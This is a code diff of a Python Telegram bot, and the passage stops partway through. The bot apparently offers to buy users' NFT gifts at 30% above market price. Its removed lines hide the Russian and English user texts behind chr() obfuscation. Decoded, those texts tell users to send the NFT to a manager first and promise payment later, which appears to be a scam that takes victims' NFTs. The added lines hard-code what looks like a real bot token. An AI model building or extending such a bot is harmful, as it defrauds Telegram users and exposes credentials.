@@ -1,229 +1,488 @@
 import logging
+import re
 import random
-import os
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
-Application, CommandHandler, CallbackQueryHandler,
-MessageHandler, filters, ContextTypes, ConversationHandler
+    Application, CommandHandler, CallbackQueryHandler,
+    MessageHandler, filters, ContextTypes, ConversationHandler
 )
 
-TOKEN = open(chr(116)+chr(111)+chr(107)+chr(101)+chr(110)+chr(46)+chr(116)+chr(120)+chr(116)).read().strip()
-ADMIN_ID = int(open(chr(97)+chr(100)+chr(109)+chr(105)+chr(110)+chr(46)+chr(116)+chr(120)+chr(116)).read().strip())
-MANAGER = open(chr(109)+chr(97)+chr(110)+chr(97)+chr(103)+chr(101)+chr(114)+chr(46)+chr(116)+chr(120)+chr(116)).read().strip()
+# ==================== CONFIG ====================
+BOT_TOKEN = "8729370914:AAFe5bDtSnGxuUbu-yUZ7dhNoRT-boOHkik"
+ADMIN_ID = 174415647
+MANAGER_USERNAME = "@hostelman"
+SUPPORT_USERNAME = "@hostelman"
+
+# ==================== STATES ====================
+WAITING_NFT_LINK = 1
+WAITING_PAYMENT_METHOD = 2
+WAITING_REQUISITES = 3
 
 logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(**name**)
+logger = logging.getLogger(__name__)
 
-LANG, MAIN_MENU, SELL_NFT_LINK, SELL_CURRENCY, SELL_CONFIRM, SELL_REQUISITES = range(6)
+# ==================== TEXTS ====================
 
-TEXTS = {
-chr(114)+chr(117): {
-chr(119)+chr(101)+chr(108)+chr(99)+chr(111)+chr(109)+chr(101): chr(1055)+chr(1088)+chr(1080)+chr(1074)+chr(1077)+chr(1090)+chr(1089)+chr(1090)+chr(1074)+chr(1091)+chr(1102)+chr(33)+chr(32)+chr(1069)+chr(1090)+chr(1086)+chr(32)+chr(1040)+chr(1074)+chr(1090)+chr(1086)+chr(1084)+chr(1072)+chr(1090)+chr(1080)+chr(1095)+chr(1077)+chr(1089)+chr(1082)+chr(1072)+chr(1103)+chr(32)+chr(1057)+chr(1082)+chr(1091)+chr(1087)+chr(1082)+chr(1072)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(1087)+chr(1086)+chr(1076)+chr(1072)+chr(1088)+chr(1082)+chr(1086)+chr(1074)+chr(32)+chr(1074)+chr(32)+chr(84)+chr(101)+chr(108)+chr(101)+chr(103)+chr(114)+chr(97)+chr(109)+chr(10)+chr(10)+chr(1052)+chr(1099)+chr(32)+chr(1074)+chr(1099)+chr(1082)+chr(1091)+chr(1087)+chr(1072)+chr(1077)+chr(1084)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(1087)+chr(1086)+chr(1076)+chr(1072)+chr(1088)+chr(1082)+chr(1080)+chr(32)+chr(1074)+chr(1099)+chr(1096)+chr(1077)+chr(32)+chr(1088)+chr(1099)+chr(1085)+chr(1086)+chr(1095)+chr(1085)+chr(1086)+chr(1081)+chr(32)+chr(1094)+chr(1077)+chr(1085)+chr(1099)+chr(32)+chr(1085)+chr(1072)+chr(32)+chr(51)+chr(48)+chr(37)+chr(32)+chr(8212)+chr(32)+chr(1073)+chr(1099)+chr(1089)+chr(1090)+chr(1088)+chr(1086)+chr(44)+chr(32)+chr(1073)+chr(1077)+chr(1079)+chr(1086)+chr(1087)+chr(1072)+chr(1089)+chr(1085)+chr(1086)+chr(32)+chr(1080)+chr(32)+chr(1095)+chr(1077)+chr(1089)+chr(1090)+chr(1085)+chr(1086)+chr(46)+chr(10)+chr(10)+chr(1042)+chr(1099)+chr(1073)+chr(1077)+chr(1088)+chr(1080)+chr(1090)+chr(1077)+chr(32)+chr(1076)+chr(1077)+chr(1081)+chr(1089)+chr(1090)+chr(1074)+chr(1080)+chr(1077)+chr(58),
-chr(104)+chr(111)+chr(119)+chr(95)+chr(119)+chr(111)+chr(114)+chr(107)+chr(115): chr(1050)+chr(1072)+chr(1082)+chr(32)+chr(1087)+chr(1088)+chr(1086)+chr(1074)+chr(1086)+chr(1076)+chr(1080)+chr(1090)+chr(1089)+chr(1103)+chr(32)+chr(1089)+chr(1076)+chr(1077)+chr(1083)+chr(1082)+chr(1072)+chr(63)+chr(10)+chr(10)+chr(49)+chr(46)+chr(32)+chr(1054)+chr(1090)+chr(1087)+chr(1088)+chr(1072)+chr(1074)+chr(1100)+chr(1090)+chr(1077)+chr(32)+chr(1089)+chr(1089)+chr(1099)+chr(1083)+chr(1082)+chr(1091)+chr(32)+chr(1085)+chr(1072)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(1087)+chr(1086)+chr(1076)+chr(1072)+chr(1088)+chr(1086)+chr(1082)+chr(10)+chr(50)+chr(46)+chr(32)+chr(1041)+chr(1086)+chr(1090)+chr(32)+chr(1089)+chr(1095)+chr(1080)+chr(1090)+chr(1072)+chr(1077)+chr(1090)+chr(32)+chr(1089)+chr(1090)+chr(1086)+chr(1080)+chr(1084)+chr(1086)+chr(1089)+chr(1090)+chr(1100)+chr(58)+chr(32)+chr(1084)+chr(1086)+chr(1076)+chr(1077)+chr(1083)+chr(1100)+chr(44)+chr(32)+chr(1092)+chr(1086)+chr(1085)+chr(44)+chr(32)+chr(1091)+chr(1079)+chr(1086)+chr(1088)+chr(10)+chr(51)+chr(46)+chr(32)+chr(1042)+chr(1099)+chr(1073)+chr(1077)+chr(1088)+chr(1080)+chr(1090)+chr(1077)+chr(32)+chr(1089)+chr(1087)+chr(1086)+chr(1089)+chr(1086)+chr(1073)+chr(32)+chr(1086)+chr(1087)+chr(1083)+chr(1072)+chr(1090)+chr(1099)+chr(10)+chr(52)+chr(46)+chr(32)+chr(1041)+chr(1086)+chr(1090)+chr(32)+chr(1087)+chr(1088)+chr(1077)+chr(1076)+chr(1083)+chr(1072)+chr(1075)+chr(1072)+chr(1077)+chr(1090)+chr(32)+chr(1094)+chr(1077)+chr(1085)+chr(1091)+chr(32)+chr(43)+chr(51)+chr(48)+chr(37)+chr(32)+chr(1082)+chr(32)+chr(1088)+chr(1099)+chr(1085)+chr(1082)+chr(1091)+chr(10)+chr(53)+chr(46)+chr(32)+chr(1055)+chr(1086)+chr(1076)+chr(1090)+chr(1074)+chr(1077)+chr(1088)+chr(1076)+chr(1080)+chr(1090)+chr(1077)+chr(32)+chr(1089)+chr(1076)+chr(1077)+chr(1083)+chr(1082)+chr(1091)+chr(10)+chr(54)+chr(46)+chr(32)+chr(1054)+chr(1090)+chr(1087)+chr(1088)+chr(1072)+chr(1074)+chr(1100)+chr(1090)+chr(1077)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(1084)+chr(1077)+chr(1085)+chr(1077)+chr(1076)+chr(1078)+chr(1077)+chr(1088)+chr(1091)+chr(32)+chr(64)+chr(104)+chr(111)+chr(115)+chr(116)+chr(101)+chr(108)+chr(109)+chr(97)+chr(110)+chr(32)+chr(1080)+chr(32)+chr(1087)+chr(1086)+chr(1083)+chr(1091)+chr(1095)+chr(1080)+chr(1090)+chr(1077)+chr(32)+chr(1086)+chr(1087)+chr(1083)+chr(1072)+chr(1090)+chr(1091),
-chr(115)+chr(117)+chr(112)+chr(112)+chr(111)+chr(114)+chr(116): chr(1055)+chr(1086)+chr(1076)+chr(1076)+chr(1077)+chr(1088)+chr(1078)+chr(1082)+chr(1072)+chr(10)+chr(10)+chr(1055)+chr(1086)+chr(32)+chr(1074)+chr(1089)+chr(1077)+chr(1084)+chr(32)+chr(1074)+chr(1086)+chr(1087)+chr(1088)+chr(1086)+chr(1089)+chr(1072)+chr(1084)+chr(58)+chr(32)+chr(64)+chr(104)+chr(111)+chr(115)+chr(116)+chr(101)+chr(108)+chr(109)+chr(97)+chr(110)+chr(10)+chr(10)+chr(1056)+chr(1072)+chr(1073)+chr(1086)+chr(1090)+chr(1072)+chr(1077)+chr(1084)+chr(32)+chr(50)+chr(52)+chr(47)+chr(55)+chr(33),
-chr(115)+chr(101)+chr(110)+chr(100)+chr(95)+chr(108)+chr(105)+chr(110)+chr(107): chr(1054)+chr(1090)+chr(1087)+chr(1088)+chr(1072)+chr(1074)+chr(1100)+chr(1090)+chr(1077)+chr(32)+chr(1089)+chr(1089)+chr(1099)+chr(1083)+chr(1082)+chr(1091)+chr(32)+chr(1085)+chr(1072)+chr(32)+chr(1074)+chr(1072)+chr(1096)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(1087)+chr(1086)+chr(1076)+chr(1072)+chr(1088)+chr(1086)+chr(1082)+chr(10)+chr(1055)+chr(1088)+chr(1080)+chr(1084)+chr(1077)+chr(1088)+chr(58)+chr(32)+chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(116)+chr(46)+chr(109)+chr(101)+chr(47)+chr(110)+chr(102)+chr(116)+chr(47)+chr(80)+chr(108)+chr(117)+chr(115)+chr(104)+chr(80)+chr(101)+chr(112)+chr(101)+chr(45)+chr(50)+chr(49)+chr(51)+chr(51),
-chr(105)+chr(110)+chr(118)+chr(97)+chr(108)+chr(105)+chr(100)+chr(95)+chr(108)+chr(105)+chr(110)+chr(107): chr(1069)+chr(1090)+chr(1086)+chr(32)+chr(1085)+chr(1077)+chr(32)+chr(1089)+chr(1089)+chr(1099)+chr(1083)+chr(1082)+chr(1072)+chr(32)+chr(78)+chr(70)+chr(84)+chr(46)+chr(32)+chr(1054)+chr(1090)+chr(1087)+chr(1088)+chr(1072)+chr(1074)+chr(1100)+chr(1090)+chr(1077)+chr(32)+chr(1089)+chr(1089)+chr(1099)+chr(1083)+chr(1082)+chr(1091)+chr(32)+chr(1074)+chr(1080)+chr(1076)+chr(1072)+chr(58)+chr(10)+chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(116)+chr(46)+chr(109)+chr(101)+chr(47)+chr(110)+chr(102)+chr(116)+chr(47)+chr(1053)+chr(1072)+chr(1079)+chr(1074)+chr(1072)+chr(1085)+chr(1080)+chr(1077)+chr(45)+chr(1053)+chr(1086)+chr(1084)+chr(1077)+chr(1088),
-chr(99)+chr(104)+chr(111)+chr(111)+chr(115)+chr(101)+chr(95)+chr(99)+chr(117)+chr(114)+chr(114)+chr(101)+chr(110)+chr(99)+chr(121): chr(1042)+chr(1099)+chr(1073)+chr(1077)+chr(1088)+chr(1080)+chr(1090)+chr(1077)+chr(32)+chr(1089)+chr(1087)+chr(1086)+chr(1089)+chr(1086)+chr(1073)+chr(32)+chr(1087)+chr(1086)+chr(1083)+chr(1091)+chr(1095)+chr(1077)+chr(1085)+chr(1080)+chr(1103)+chr(32)+chr(1086)+chr(1087)+chr(1083)+chr(1072)+chr(1090)+chr(1099)+chr(58),
-chr(111)+chr(102)+chr(102)+chr(101)+chr(114): chr(78)+chr(70)+chr(84)+chr(58)+chr(32)+chr(123)+chr(108)+chr(105)+chr(110)+chr(107)+chr(125)+chr(10)+chr(1056)+chr(1099)+chr(1085)+chr(1086)+chr(1095)+chr(1085)+chr(1072)+chr(1103)+chr(32)+chr(1094)+chr(1077)+chr(1085)+chr(1072)+chr(58)+chr(32)+chr(126)+chr(123)+chr(109)+chr(97)+chr(114)+chr(107)+chr(101)+chr(116)+chr(125)+chr(32)+chr(123)+chr(115)+chr(121)+chr(109)+chr(125)+chr(10)+chr(1052)+chr(1086)+chr(1103)+chr(32)+chr(1094)+chr(1077)+chr(1085)+chr(1072)+chr(32)+chr(40)+chr(43)+chr(51)+chr(48)+chr(37)+chr(41)+chr(58)+chr(32)+chr(123)+chr(111)+chr(102)+chr(102)+chr(101)+chr(114)+chr(125)+chr(32)+chr(123)+chr(115)+chr(121)+chr(109)+chr(125)+chr(10)+chr(10)+chr(1057)+chr(1086)+chr(1075)+chr(1083)+chr(1072)+chr(1089)+chr(1085)+chr(1099)+chr(63),
-chr(115)+chr(101)+chr(110)+chr(100)+chr(95)+chr(114)+chr(101)+chr(113)+chr(117)+chr(105)+chr(115)+chr(105)+chr(116)+chr(101)+chr(115): chr(1042)+chr(1074)+chr(1077)+chr(1076)+chr(1080)+chr(1090)+chr(1077)+chr(32)+chr(1088)+chr(1077)+chr(1082)+chr(1074)+chr(1080)+chr(1079)+chr(1080)+chr(1090)+chr(1099)+chr(32)+chr(1076)+chr(1083)+chr(1103)+chr(32)+chr(1086)+chr(1087)+chr(1083)+chr(1072)+chr(1090)+chr(1099)+chr(32)+chr(40)+chr(123)+chr(99)+chr(117)+chr(114)+chr(114)+chr(101)+chr(110)+chr(99)+chr(121)+chr(125)+chr(41)+chr(58),
-chr(100)+chr(101)+chr(97)+chr(108)+chr(95)+chr(99)+chr(114)+chr(101)+chr(97)+chr(116)+chr(101)+chr(100): chr(1057)+chr(1076)+chr(1077)+chr(1083)+chr(1082)+chr(1072)+chr(32)+chr(1086)+chr(1092)+chr(1086)+chr(1088)+chr(1084)+chr(1083)+chr(1077)+chr(1085)+chr(1072)+chr(33)+chr(10)+chr(10)+chr(78)+chr(70)+chr(84)+chr(58)+chr(32)+chr(123)+chr(108)+chr(105)+chr(110)+chr(107)+chr(125)+chr(10)+chr(1057)+chr(1091)+chr(1084)+chr(1084)+chr(1072)+chr(58)+chr(32)+chr(123)+chr(111)+chr(102)+chr(102)+chr(101)+chr(114)+chr(125)+chr(32)+chr(123)+chr(115)+chr(121)+chr(109)+chr(125)+chr(10)+chr(1056)+chr(1077)+chr(1082)+chr(1074)+chr(1080)+chr(1079)+chr(1080)+chr(1090)+chr(1099)+chr(58)+chr(32)+chr(123)+chr(114)+chr(101)+chr(113)+chr(125)+chr(10)+chr(10)+chr(1054)+chr(1090)+chr(1087)+chr(1088)+chr(1072)+chr(1074)+chr(1100)+chr(1090)+chr(1077)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(1084)+chr(1077)+chr(1085)+chr(1077)+chr(1076)+chr(1078)+chr(1077)+chr(1088)+chr(1091)+chr(32)+chr(64)+chr(104)+chr(111)+chr(115)+chr(116)+chr(101)+chr(108)+chr(109)+chr(97)+chr(110)+chr(10)+chr(1055)+chr(1086)+chr(1089)+chr(1083)+chr(1077)+chr(32)+chr(1087)+chr(1086)+chr(1083)+chr(1091)+chr(1095)+chr(1077)+chr(1085)+chr(1080)+chr(1103)+chr(32)+chr(1084)+chr(1077)+chr(1085)+chr(1077)+chr(1076)+chr(1078)+chr(1077)+chr(1088)+chr(32)+chr(1087)+chr(1077)+chr(1088)+chr(1077)+chr(1074)+chr(1077)+chr(1076)+chr(1105)+chr(1090)+chr(32)+chr(1086)+chr(1087)+chr(1083)+chr(1072)+chr(1090)+chr(1091)+chr(32)+chr(1074)+chr(32)+chr(1090)+chr(1077)+chr(1095)+chr(1077)+chr(1085)+chr(1080)+chr(1077)+chr(32)+chr(53)+chr(45)+chr(49)+chr(53)+chr(32)+chr(1084)+chr(1080)+chr(1085)+chr(1091)+chr(1090)+chr(46),
-chr(100)+chr(101)+chr(97)+chr(108)+chr(95)+chr(99)+chr(97)+chr(110)+chr(99)+chr(101)+chr(108)+chr(108)+chr(101)+chr(100): chr(1057)+chr(1076)+chr(1077)+chr(1083)+chr(1082)+chr(1072)+chr(32)+chr(1086)+chr(1090)+chr(1084)+chr(1077)+chr(1085)+chr(1077)+chr(1085)+chr(1072)+chr(46),
-chr(98)+chr(116)+chr(110)+chr(95)+chr(115)+chr(101)+chr(108)+chr(108): chr(1055)+chr(1088)+chr(1086)+chr(1076)+chr(1072)+chr(1090)+chr(1100)+chr(32)+chr(78)+chr(70)+chr(84),
-chr(98)+chr(116)+chr(110)+chr(95)+chr(104)+chr(111)+chr(119): chr(1050)+chr(1072)+chr(1082)+chr(32)+chr(1087)+chr(1088)+chr(1086)+chr(1074)+chr(1086)+chr(1076)+chr(1080)+chr(1090)+chr(1089)+chr(1103)+chr(32)+chr(1089)+chr(1076)+chr(1077)+chr(1083)+chr(1082)+chr(1072)+chr(63),
-chr(98)+chr(116)+chr(110)+chr(95)+chr(115)+chr(117)+chr(112)+chr(112)+chr(111)+chr(114)+chr(116): chr(1055)+chr(1086)+chr(1076)+chr(1076)+chr(1077)+chr(1088)+chr(1078)+chr(1082)+chr(1072),
-chr(98)+chr(116)+chr(110)+chr(95)+chr(121)+chr(101)+chr(115): chr(1044)+chr(1072)+chr(44)+chr(32)+chr(1089)+chr(1086)+chr(1075)+chr(1083)+chr(1072)+chr(1089)+chr(1077)+chr(1085),
-chr(98)+chr(116)+chr(110)+chr(95)+chr(110)+chr(111): chr(1053)+chr(1077)+chr(1090)+chr(44)+chr(32)+chr(1086)+chr(1090)+chr(1082)+chr(1072)+chr(1079)+chr(1072)+chr(1090)+chr(1100)+chr(1089)+chr(1103),
-chr(98)+chr(116)+chr(110)+chr(95)+chr(98)+chr(97)+chr(99)+chr(107): chr(1053)+chr(1072)+chr(1079)+chr(1072)+chr(1076),
-},
-chr(101)+chr(110): {
-chr(119)+chr(101)+chr(108)+chr(99)+chr(111)+chr(109)+chr(101): chr(87)+chr(101)+chr(108)+chr(99)+chr(111)+chr(109)+chr(101)+chr(33)+chr(32)+chr(65)+chr(117)+chr(116)+chr(111)+chr(109)+chr(97)+chr(116)+chr(105)+chr(99)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(71)+chr(105)+chr(102)+chr(116)+chr(32)+chr(66)+chr(117)+chr(121)+chr(111)+chr(117)+chr(116)+chr(32)+chr(66)+chr(111)+chr(116)+chr(10)+chr(10)+chr(87)+chr(101)+chr(32)+chr(98)+chr(117)+chr(121)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(103)+chr(105)+chr(102)+chr(116)+chr(115)+chr(32)+chr(51)+chr(48)+chr(37)+chr(32)+chr(97)+chr(98)+chr(111)+chr(118)+chr(101)+chr(32)+chr(109)+chr(97)+chr(114)+chr(107)+chr(101)+chr(116)+chr(32)+chr(112)+chr(114)+chr(105)+chr(99)+chr(101)+chr(46)+chr(10)+chr(10)+chr(67)+chr(104)+chr(111)+chr(111)+chr(115)+chr(101)+chr(32)+chr(97)+chr(110)+chr(32)+chr(97)+chr(99)+chr(116)+chr(105)+chr(111)+chr(110)+chr(58),
-chr(104)+chr(111)+chr(119)+chr(95)+chr(119)+chr(111)+chr(114)+chr(107)+chr(115): chr(72)+chr(111)+chr(119)+chr(32)+chr(100)+chr(111)+chr(101)+chr(115)+chr(32)+chr(116)+chr(104)+chr(101)+chr(32)+chr(100)+chr(101)+chr(97)+chr(108)+chr(32)+chr(119)+chr(111)+chr(114)+chr(107)+chr(63)+chr(10)+chr(10)+chr(49)+chr(46)+chr(32)+chr(83)+chr(101)+chr(110)+chr(100)+chr(32)+chr(97)+chr(32)+chr(108)+chr(105)+chr(110)+chr(107)+chr(32)+chr(116)+chr(111)+chr(32)+chr(121)+chr(111)+chr(117)+chr(114)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(103)+chr(105)+chr(102)+chr(116)+chr(10)+chr(50)+chr(46)+chr(32)+chr(66)+chr(111)+chr(116)+chr(32)+chr(99)+chr(97)+chr(108)+chr(99)+chr(117)+chr(108)+chr(97)+chr(116)+chr(101)+chr(115)+chr(32)+chr(112)+chr(114)+chr(105)+chr(99)+chr(101)+chr(58)+chr(32)+chr(109)+chr(111)+chr(100)+chr(101)+chr(108)+chr(44)+chr(32)+chr(98)+chr(97)+chr(99)+chr(107)+chr(103)+chr(114)+chr(111)+chr(117)+chr(110)+chr(100)+chr(44)+chr(32)+chr(112)+chr(97)+chr(116)+chr(116)+chr(101)+chr(114)+chr(110)+chr(10)+chr(51)+chr(46)+chr(32)+chr(67)+chr(104)+chr(111)+chr(111)+chr(115)+chr(101)+chr(32)+chr(112)+chr(97)+chr(121)+chr(109)+chr(101)+chr(110)+chr(116)+chr(32)+chr(109)+chr(101)+chr(116)+chr(104)+chr(111)+chr(100)+chr(10)+chr(52)+chr(46)+chr(32)+chr(66)+chr(111)+chr(116)+chr(32)+chr(111)+chr(102)+chr(102)+chr(101)+chr(114)+chr(115)+chr(32)+chr(112)+chr(114)+chr(105)+chr(99)+chr(101)+chr(32)+chr(43)+chr(51)+chr(48)+chr(37)+chr(32)+chr(116)+chr(111)+chr(32)+chr(109)+chr(97)+chr(114)+chr(107)+chr(101)+chr(116)+chr(10)+chr(53)+chr(46)+chr(32)+chr(67)+chr(111)+chr(110)+chr(102)+chr(105)+chr(114)+chr(109)+chr(32)+chr(116)+chr(104)+chr(101)+chr(32)+chr(100)+chr(101)+chr(97)+chr(108)+chr(10)+chr(54)+chr(46)+chr(32)+chr(83)+chr(101)+chr(110)+chr(100)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(116)+chr(111)+chr(32)+chr(109)+chr(97)+chr(110)+chr(97)+chr(103)+chr(101)+chr(114)+chr(32)+chr(64)+chr(104)+chr(111)+chr(115)+chr(116)+chr(101)+chr(108)+chr(109)+chr(97)+chr(110)+chr(32)+chr(97)+chr(110)+chr(100)+chr(32)+chr(114)+chr(101)+chr(99)+chr(101)+chr(105)+chr(118)+chr(101)+chr(32)+chr(112)+chr(97)+chr(121)+chr(109)+chr(101)+chr(110)+chr(116),
-chr(115)+chr(117)+chr(112)+chr(112)+chr(111)+chr(114)+chr(116): chr(83)+chr(117)+chr(112)+chr(112)+chr(111)+chr(114)+chr(116)+chr(10)+chr(10)+chr(67)+chr(111)+chr(110)+chr(116)+chr(97)+chr(99)+chr(116)+chr(58)+chr(32)+chr(64)+chr(104)+chr(111)+chr(115)+chr(116)+chr(101)+chr(108)+chr(109)+chr(97)+chr(110)+chr(10)+chr(10)+chr(65)+chr(118)+chr(97)+chr(105)+chr(108)+chr(97)+chr(98)+chr(108)+chr(101)+chr(32)+chr(50)+chr(52)+chr(47)+chr(55)+chr(33),
-chr(115)+chr(101)+chr(110)+chr(100)+chr(95)+chr(108)+chr(105)+chr(110)+chr(107): chr(83)+chr(101)+chr(110)+chr(100)+chr(32)+chr(116)+chr(104)+chr(101)+chr(32)+chr(108)+chr(105)+chr(110)+chr(107)+chr(32)+chr(116)+chr(111)+chr(32)+chr(121)+chr(111)+chr(117)+chr(114)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(103)+chr(105)+chr(102)+chr(116)+chr(10)+chr(69)+chr(120)+chr(97)+chr(109)+chr(112)+chr(108)+chr(101)+chr(58)+chr(32)+chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(116)+chr(46)+chr(109)+chr(101)+chr(47)+chr(110)+chr(102)+chr(116)+chr(47)+chr(80)+chr(108)+chr(117)+chr(115)+chr(104)+chr(80)+chr(101)+chr(112)+chr(101)+chr(45)+chr(50)+chr(49)+chr(51)+chr(51),
-chr(105)+chr(110)+chr(118)+chr(97)+chr(108)+chr(105)+chr(100)+chr(95)+chr(108)+chr(105)+chr(110)+chr(107): chr(84)+chr(104)+chr(105)+chr(115)+chr(32)+chr(105)+chr(115)+chr(32)+chr(110)+chr(111)+chr(116)+chr(32)+chr(97)+chr(110)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(108)+chr(105)+chr(110)+chr(107)+chr(46)+chr(32)+chr(83)+chr(101)+chr(110)+chr(100)+chr(32)+chr(97)+chr(32)+chr(108)+chr(105)+chr(110)+chr(107)+chr(32)+chr(108)+chr(105)+chr(107)+chr(101)+chr(58)+chr(10)+chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(116)+chr(46)+chr(109)+chr(101)+chr(47)+chr(110)+chr(102)+chr(116)+chr(47)+chr(78)+chr(97)+chr(109)+chr(101)+chr(45)+chr(78)+chr(117)+chr(109)+chr(98)+chr(101)+chr(114),
-chr(99)+chr(104)+chr(111)+chr(111)+chr(115)+chr(101)+chr(95)+chr(99)+chr(117)+chr(114)+chr(114)+chr(101)+chr(110)+chr(99)+chr(121): chr(67)+chr(104)+chr(111)+chr(111)+chr(115)+chr(101)+chr(32)+chr(121)+chr(111)+chr(117)+chr(114)+chr(32)+chr(112)+chr(97)+chr(121)+chr(109)+chr(101)+chr(110)+chr(116)+chr(32)+chr(109)+chr(101)+chr(116)+chr(104)+chr(111)+chr(100)+chr(58),
-chr(111)+chr(102)+chr(102)+chr(101)+chr(114): chr(78)+chr(70)+chr(84)+chr(58)+chr(32)+chr(123)+chr(108)+chr(105)+chr(110)+chr(107)+chr(125)+chr(10)+chr(77)+chr(97)+chr(114)+chr(107)+chr(101)+chr(116)+chr(32)+chr(112)+chr(114)+chr(105)+chr(99)+chr(101)+chr(58)+chr(32)+chr(126)+chr(123)+chr(109)+chr(97)+chr(114)+chr(107)+chr(101)+chr(116)+chr(125)+chr(32)+chr(123)+chr(115)+chr(121)+chr(109)+chr(125)+chr(10)+chr(77)+chr(121)+chr(32)+chr(112)+chr(114)+chr(105)+chr(99)+chr(101)+chr(32)+chr(40)+chr(43)+chr(51)+chr(48)+chr(37)+chr(41)+chr(58)+chr(32)+chr(123)+chr(111)+chr(102)+chr(102)+chr(101)+chr(114)+chr(125)+chr(32)+chr(123)+chr(115)+chr(121)+chr(109)+chr(125)+chr(10)+chr(10)+chr(68)+chr(111)+chr(32)+chr(121)+chr(111)+chr(117)+chr(32)+chr(97)+chr(103)+chr(114)+chr(101)+chr(101)+chr(63),
-chr(115)+chr(101)+chr(110)+chr(100)+chr(95)+chr(114)+chr(101)+chr(113)+chr(117)+chr(105)+chr(115)+chr(105)+chr(116)+chr(101)+chr(115): chr(69)+chr(110)+chr(116)+chr(101)+chr(114)+chr(32)+chr(121)+chr(111)+chr(117)+chr(114)+chr(32)+chr(112)+chr(97)+chr(121)+chr(109)+chr(101)+chr(110)+chr(116)+chr(32)+chr(100)+chr(101)+chr(116)+chr(97)+chr(105)+chr(108)+chr(115)+chr(32)+chr(40)+chr(123)+chr(99)+chr(117)+chr(114)+chr(114)+chr(101)+chr(110)+chr(99)+chr(121)+chr(125)+chr(41)+chr(58),
-chr(100)+chr(101)+chr(97)+chr(108)+chr(95)+chr(99)+chr(114)+chr(101)+chr(97)+chr(116)+chr(101)+chr(100): chr(68)+chr(101)+chr(97)+chr(108)+chr(32)+chr(99)+chr(111)+chr(110)+chr(102)+chr(105)+chr(114)+chr(109)+chr(101)+chr(100)+chr(33)+chr(10)+chr(10)+chr(78)+chr(70)+chr(84)+chr(58)+chr(32)+chr(123)+chr(108)+chr(105)+chr(110)+chr(107)+chr(125)+chr(10)+chr(65)+chr(109)+chr(111)+chr(117)+chr(110)+chr(116)+chr(58)+chr(32)+chr(123)+chr(111)+chr(102)+chr(102)+chr(101)+chr(114)+chr(125)+chr(32)+chr(123)+chr(115)+chr(121)+chr(109)+chr(125)+chr(10)+chr(68)+chr(101)+chr(116)+chr(97)+chr(105)+chr(108)+chr(115)+chr(58)+chr(32)+chr(123)+chr(114)+chr(101)+chr(113)+chr(125)+chr(10)+chr(10)+chr(83)+chr(101)+chr(110)+chr(100)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(116)+chr(111)+chr(32)+chr(109)+chr(97)+chr(110)+chr(97)+chr(103)+chr(101)+chr(114)+chr(32)+chr(64)+chr(104)+chr(111)+chr(115)+chr(116)+chr(101)+chr(108)+chr(109)+chr(97)+chr(110)+chr(10)+chr(80)+chr(97)+chr(121)+chr(109)+chr(101)+chr(110)+chr(116)+chr(32)+chr(119)+chr(105)+chr(108)+chr(108)+chr(32)+chr(98)+chr(101)+chr(32)+chr(115)+chr(101)+chr(110)+chr(116)+chr(32)+chr(119)+chr(105)+chr(116)+chr(104)+chr(105)+chr(110)+chr(32)+chr(53)+chr(45)+chr(49)+chr(53)+chr(32)+chr(109)+chr(105)+chr(110)+chr(117)+chr(116)+chr(101)+chr(115)+chr(46),
-chr(100)+chr(101)+chr(97)+chr(108)+chr(95)+chr(99)+chr(97)+chr(110)+chr(99)+chr(101)+chr(108)+chr(108)+chr(101)+chr(100): chr(68)+chr(101)+chr(97)+chr(108)+chr(32)+chr(99)+chr(97)+chr(110)+chr(99)+chr(101)+chr(108)+chr(108)+chr(101)+chr(100)+chr(46),
-chr(98)+chr(116)+chr(110)+chr(95)+chr(115)+chr(101)+chr(108)+chr(108): chr(83)+chr(101)+chr(108)+chr(108)+chr(32)+chr(78)+chr(70)+chr(84),
-chr(98)+chr(116)+chr(110)+chr(95)+chr(104)+chr(111)+chr(119): chr(72)+chr(111)+chr(119)+chr(32)+chr(100)+chr(111)+chr(101)+chr(115)+chr(32)+chr(105)+chr(116)+chr(32)+chr(119)+chr(111)+chr(114)+chr(107)+chr(63),
-chr(98)+chr(116)+chr(110)+chr(95)+chr(115)+chr(117)+chr(112)+chr(112)+chr(111)+chr(114)+chr(116): chr(83)+chr(117)+chr(112)+chr(112)+chr(111)+chr(114)+chr(116),
-chr(98)+chr(116)+chr(110)+chr(95)+chr(121)+chr(101)+chr(115): chr(89)+chr(101)+chr(115)+chr(44)+chr(32)+chr(97)+chr(103)+chr(114)+chr(101)+chr(101),
-chr(98)+chr(116)+chr(110)+chr(95)+chr(110)+chr(111): chr(78)+chr(111)+chr(44)+chr(32)+chr(99)+chr(97)+chr(110)+chr(99)+chr(101)+chr(108),
-chr(98)+chr(116)+chr(110)+chr(95)+chr(98)+chr(97)+chr(99)+chr(107): chr(66)+chr(97)+chr(99)+chr(107),
-},
-}
-
-CURRENCIES = {
-chr(67)+chr(114)+chr(121)+chr(112)+chr(116)+chr(111)+chr(66)+chr(111)+chr(116): {chr(115)+chr(121)+chr(109): chr(85)+chr(83)+chr(68)+chr(84), chr(114)+chr(97)+chr(116)+chr(101): 1.0},
